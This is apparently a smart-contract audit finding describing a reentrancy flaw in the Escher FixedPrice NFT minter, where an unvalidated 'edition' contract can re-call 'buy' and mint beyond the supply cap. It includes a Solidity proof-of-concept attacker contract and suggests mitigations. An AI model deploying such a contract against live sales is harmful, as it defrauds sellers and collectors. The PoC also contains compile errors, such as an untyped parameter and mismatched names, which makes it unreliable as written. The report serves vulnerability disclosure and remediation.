# Vulnerability details


## Impact
``FixedPrice`` contract should have a limited supply of NFTs. 

The user creating a ``FixedPrice`` instance can supply a specially crafted contract trough ``FixedPrice.Sale.edition`` attribute that can bypass the limited supply for a chosen user address.

## Proof of Concept
The ``FixedPrice.Sale.edition`` is passed without any validation on this line:

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPriceFactory.sol#L35

The ``FixedPrice::initialize`` just copies the ``Sale`` structure without any validation on this line

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L78-L82

If we use the something like the following contract for the ``edition`` attribute:

```solidity
contract MintMoreNFTs is Owned {
    address fixedPrice;
    address ourUser;
    uint256 buyAmount;
    uint256 repeat;

    constructor(address _fixedPrice) {
        fixedPrice = _fixedPrice;
    }

    function setConfig(uint256 _amount, uint256 _repeat, _user) external onlyOwner {
        buyAmount = _amount;
        repeat = _repeat;
        ourUser = _user;
    }

    function supportsInterface(
        bytes4 interfaceId
    )
        public
        view
        returns (bool)
    {
        return true;
    }

        function onERC721Received(
            address operator,
            address from,
            uint256 tokenId,
            bytes calldata data
    ) external pure override returns (bytes4) {
        if (from == _ourUser && repeat>0) {
            repeat -= 1;
            fixedPrice.buy(buyAmount);
        }

        return this.onERC721Received.selector;
    }
}
```

when ``mint`` is called inside ``buy`` 

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L66

we can reenter the buying logic before this line is updated

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L69

and in doing so minting more NFTs than allowed.

## Tools Used
Manual review

## Recommended Mitigation Steps
We have options:

* add oz nonRentrant like modifier or
* CEI: move the ``sale.currentId = newId;`` line before the mint loop or
* whitelist ``edition`` filed when creating Escher NFTs

